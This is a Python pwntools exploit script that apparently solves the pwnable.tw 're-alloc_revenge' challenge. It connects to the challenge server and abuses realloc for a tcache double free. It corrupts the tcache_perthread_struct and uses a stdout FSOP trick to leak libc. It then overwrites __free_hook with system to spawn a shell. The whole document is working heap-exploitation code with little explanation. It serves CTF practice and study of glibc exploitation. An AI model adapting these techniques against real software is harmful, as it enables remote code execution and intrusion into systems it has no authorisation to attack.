#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./re-alloc_revenge_patched')
libc = ELF('./libc.so')
ld = ELF('./ld-2.29.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

def alloc(idx, sz, data):
    sla('Your choice: ', '1')
    sla('Index:', str(idx))
    sla('Size:', str(sz))
    sa('Data:', data)

def realloc(idx, sz, data=None):
    sla('Your choice: ', '2')
    sla('Index:', str(idx))
    sla('Size:', str(sz))
    if data != None:
        sa('Data:', data)

def free(idx):
    sla('Your choice: ', '3')
    sla('Index:', str(idx))

while True:
    while True:
        local = 0
        if local:
            p = process([elf.path])
        else:
            p = remote('chall.pwnable.tw', 10310)

        # bruteforce heap address
        # https://blog.csdn.net/weixin_44145820/article/details/105585889
        alloc(0, 0x48, 'A')
        realloc(0, 0x0)
        realloc(0, 0x48, up64(0) * 2) # edit fd & bk --> bypass dup check
        realloc(0, 0x0) # double free
        realloc(0, 0x48, '\x10\xa0') # edit fd to tcache_perthread_struct

        try:
            # edit tcache entry
            alloc(1, 0x48, 'B') # get chunk from tcache
            realloc(1, 0x58, 'B') # resize chunk
            free(1) # put into tcache
            alloc(1, 0x48, '\x00' * 0x23 + '\x07') # edit tcache->count
            realloc(1, 0x0) # put tcache_perthread_struct into unsorted bin    

            # FSOP to leak libc address
            # https://hackmd.io/@wxrdnx/r1CXaFHdv#Re-alloc-Revenge
            realloc(1, 0x48, '\x58\x47') # tricky --> edit fd to _IO_2_1_stdout_ & set tcache[0x3] = current chunk
            break
        except EOFError:
            p.close()
            continue

    realloc(0, 0x38, up64(0) * 2) # shrink & put a 0x20 chunk into fast bin
    free(0) # put into fast bin
    alloc(0, 0x48, 'C')
    free(0) # put into fast bin
    try:
        #context.log_level = 'debug'
        alloc(0, 0x48, '/bin/sh\x00' + up64(0xfbad1800) + up64(0) * 3) # '\x00' will be add automatically <-- get from tcache
        res = r(0x8)
        if res == '$$$$$$$$':
            p.close()
            continue
        else:
            #gdb.attach(p)
            ru(up64(0xfbad1800))
            data = r(0x28)
            break
    except EOFError:
        p.close()
        continue

libc_base = uu64(data[-0x8:]) - 0x1e57e4
info('libc_base = ' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
info('free_hook = ' + hex(free_hook))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))

# overwrite __free_hook to system
realloc(1, 0x48, '\x00' * 0x40 + up64(free_hook)) # put &__free_hook into tcache[0x0]
free(1)
alloc(1, 0x18, up64(system))

#gdb.attach(p)
# get shell
free(0)

p.interactive()

